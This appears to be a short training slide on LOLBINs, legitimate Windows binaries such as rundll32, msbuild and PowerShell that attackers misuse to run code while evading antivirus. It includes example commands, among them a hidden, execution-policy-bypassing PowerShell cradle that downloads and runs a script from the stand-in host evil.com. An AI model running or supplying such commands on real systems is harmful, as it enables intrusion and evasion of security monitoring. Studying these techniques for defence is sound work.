Trusted Execution

Living Off The Land Binaries (LOLBINs) in Practice

Misusing legitimate system binaries to execute malicious code.

What are LOLBINs?

  • **Legitimate Binaries:** Trusted executables or scripts already present on the operating system (e.g., Windows).
  • **Misuse, Not Malware:** Attackers leverage their intended functionality for malicious purposes.
  • **Blends In:** Execution of these binaries is generally not flagged as suspicious by default AV rules.
  • **Reduces Footprint:** Avoids dropping new, potentially detectable, malicious files onto the system.
Advantage

Makes malicious activity appear to be part of normal system operations, making detection difficult for behavioral AV.

Common LOLBIN Examples

# rundll32.exe
  - Executes a function from a specified DLL.
  - Example: rundll32.exe C:\path  o\malicious.dll,DllMain

# msbuild.exe
  - Microsoft Build Engine, compiles project files.
  - Can compile and execute inline C# code.
  - Example: msbuild.exe malicious.xml

# powershell.exe
  - Powerful scripting language.
  - Can execute arbitrary commands and scripts.
  - Example: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://evil.com/shell.ps1')"

# Why they work:
  - These are legitimate, signed binaries.
  - Their execution is often whitelisted or less scrutinized.
Consideration

While effective, advanced EDR solutions are increasingly monitoring for suspicious usage patterns of LOLBINs.

Key Takeaway

LOLBINs are powerful evasion tools because they leverage trusted system binaries to execute malicious code, making it difficult for behavioral AV to distinguish between legitimate and malicious activity.
